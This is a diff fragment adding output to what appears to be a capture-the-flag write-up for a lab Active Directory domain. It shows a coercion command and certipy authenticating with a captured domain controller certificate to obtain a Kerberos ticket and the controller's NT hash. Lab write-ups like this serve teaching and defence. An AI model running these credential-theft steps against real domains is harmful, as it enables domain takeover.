@@ -1160,6 +1160,23 @@ coercer coerce -l 10.10.14.148 -t dc01.ghostlink.htb -d ghostlink.htb -u nvirell
 
 ```
 
+```
+certipy-ad auth -pfx DC01.pfx -dc-ip 10.129.191.32
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN DNS Host Name: 'dc01.ghostlink.htb'
+[*]     Security Extension SID: 'S-1-5-21-3426459382-1936297842-2312468024-1000'
+[*] Using principal: 'dc01$@ghostlink.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'dc01.ccache'
+[*] Wrote credential cache to 'dc01.ccache'
+[*] Trying to retrieve NT hash for 'dc01$'
+[*] Got hash for 'dc01$@ghostlink.htb': aad3b435b51404eeaad3b435b51404ee:b134be0fd94663725991c87bdff7c42c
+                                                                                                          
+```
+
 ---
 ## Remediation
 
